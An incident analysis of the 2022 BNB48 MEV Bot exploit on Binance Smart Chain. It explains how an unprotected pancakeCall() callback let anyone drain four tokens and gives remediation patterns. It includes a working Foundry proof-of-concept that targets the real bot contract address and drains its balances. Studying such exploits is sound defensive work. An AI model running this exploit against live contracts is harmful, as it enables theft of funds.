# BNB48 MEV Bot — Unprotected pancakeCall() Callback Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-09 |
| **Protocol** | BNB48 MEV Bot |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Address unconfirmed (USDT, WBNB, BUSD, USDC drained) |
| **Vulnerable Contract (MEV Bot)** | [0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d](https://bscscan.com/address/0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **BUSD** | [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56](https://bscscan.com/address/0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56) |
| **USDC** | [0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d](https://bscscan.com/address/0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d) |
| **Root Cause** | The MEV Bot's `pancakeCall()` function does not validate the caller, allowing any arbitrary address to withdraw tokens |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/BNB48MEVBot_exp.sol) |

---
## 1. Vulnerability Overview

The BNB48 MEV Bot is an automated arbitrage bot contract on BSC that executed trades via the PancakeSwap flash swap callback (`pancakeCall()`). However, the `pancakeCall()` function contained no logic to verify whether the caller (`msg.sender`) was an actual PancakeSwap pair. The attacker directly called the MEV Bot's `pancakeCall()`, passing the token amounts to drain as parameters and encoding their own address in the `data` field as the recipient, thereby stealing all four held tokens.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pancakeCall() - no caller validation
contract MEVBot {
    function pancakeCall(
        address sender,    // ❌ not validated
        uint256 amount0,   // amount of token0 to drain (attacker-controlled)
        uint256 amount1,   // amount of token1 to drain (attacker-controlled)
        bytes calldata data // ❌ contains recipient address (attacker-controlled)
    ) external {
        // ❌ does not verify that msg.sender is an actual PancakeSwap pair
        // ❌ does not verify that sender previously called swap()

        address recipient = abi.decode(data, (address));

        // transfers amount0, amount1 tokens to recipient
        if (amount0 > 0) {
            IERC20(token0).transfer(recipient, amount0);
        }
        if (amount1 > 0) {
            IERC20(token1).transfer(recipient, amount1);
        }
    }
}

// ✅ Correct pattern - caller and sender validation
contract MEVBot {
    mapping(address => bool) public authorizedPairs;

    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        // ✅ verify that the caller is an authorized PancakeSwap pair
        require(authorizedPairs[msg.sender], "Unauthorized pair");
        // ✅ verify that sender is this contract itself
        require(sender == address(this), "Unauthorized sender");

        address recipient = abi.decode(data, (address));
        // ...
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompiled


**BNB48MEVBot_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: The MEV Bot's `pancakeCall()` function does not validate the caller, allowing any arbitrary address to withdraw tokens
    function pancakeCall(address arg0, uint256 arg1, uint256 arg2, bytes arg3) external {}  // 0x84800812  // ❌ vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Query MEV Bot's USDT balance
    │       amount0 = USDT.balanceOf(MEVBot)
    │
    ├─[2] MEVBot.pancakeCall(
    │         sender=attacker,
    │         amount0=USDT balance,
    │         amount1=0,
    │         data=abi.encode(attacker)
    │       ) direct call
    │       └─ ❌ no msg.sender validation → passes
    │           → transfers full USDT balance to attacker
    │
    ├─[3] Repeat the same attack for WBNB, BUSD, USDC (4 times total)
    │
    └─[4] All 4 tokens fully drained
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface MEVBot {
    // ❌ Public callback function with no access control
    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract BNB48MEVBotExploit is Test {
    MEVBot mevBot = MEVBot(0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);

    address attacker = address(this);

    function setUp() public {
        vm.createSelectFork("bsc", 21_297_409);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] Attacker USDT", USDT.balanceOf(attacker), 18);
        emit log_named_decimal_uint("[Start] MEVBot USDT", USDT.balanceOf(address(mevBot)), 18);

        // [Step 1] Query each token balance held by the MEV Bot
        uint256 usdtBal = USDT.balanceOf(address(mevBot));
        uint256 wbnbBal = WBNB.balanceOf(address(mevBot));
        uint256 busdBal = BUSD.balanceOf(address(mevBot));
        uint256 usdcBal = USDC.balanceOf(address(mevBot));

        // [Steps 2–5] Directly call pancakeCall() for each token
        // ⚡ No msg.sender validation → callable by anyone
        // Encode attacker address in data to designate as recipient

        mevBot.pancakeCall(attacker, usdtBal, 0, abi.encode(attacker)); // drain USDT
        mevBot.pancakeCall(attacker, wbnbBal, 0, abi.encode(attacker)); // drain WBNB
        mevBot.pancakeCall(attacker, busdBal, 0, abi.encode(attacker)); // drain BUSD
        mevBot.pancakeCall(attacker, usdcBal, 0, abi.encode(attacker)); // drain USDC

        emit log_named_decimal_uint("[End] Attacker USDT", USDT.balanceOf(attacker), 18);
        emit log_named_decimal_uint("[End] MEVBot USDT", USDT.balanceOf(address(mevBot)), 18);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Unprotected Callback Function |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Missing Access Control on Flash Loan Callback |
| **Attack Vector** | Direct call to `pancakeCall()` with arbitrary parameters |
| **Precondition** | MEV Bot contract holds token balances |
| **Impact** | Full drain of all held tokens |

---
## 6. Remediation Recommendations

1. **Validate the caller in callback functions**: In flash swap callbacks such as `pancakeCall()`, `uniswapV2Call()`, and `flashCallback()`, always verify that `msg.sender` is a legitimate DEX pair and that `sender` is this contract itself.
2. **Maintain an authorized pair whitelist**: Manage a whitelist of pair addresses permitted to initiate flash swaps.
3. **Reentrancy lock**: Apply a lock to prevent external calls from reentering while a callback function is executing.

```solidity
// ✅ Safe pancakeCall pattern
contract SafeMEVBot {
    address private immutable TRUSTED_PAIR;
    bool private _inFlashSwap;

    modifier onlyTrustedPair() {
        require(msg.sender == TRUSTED_PAIR, "Only trusted pair");
        _;
    }

    modifier noReentry() {
        require(!_inFlashSwap, "Reentrant call");
        _inFlashSwap = true;
        _;
        _inFlashSwap = false;
    }

    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external onlyTrustedPair noReentry {
        require(sender == address(this), "Invalid sender");
        // execution logic
    }
}
```

---
## 7. Lessons Learned

- **MEV bots are not immune to security vulnerabilities**: Even automated trading bots are subject to the same security principles once deployed as contracts. In practice, MEV bot contracts often hold significant funds, making them attractive targets.
- **The risk of callback patterns**: Externally callable callback functions always require caller validation. Flash swap / flash loan callbacks demand particular caution.
- **Every `external` function of a public contract is an attack surface**: Every `external` function of a contract is a potential attack entry point. Regular audits should be conducted to ensure no functions are unintentionally exposed to the public.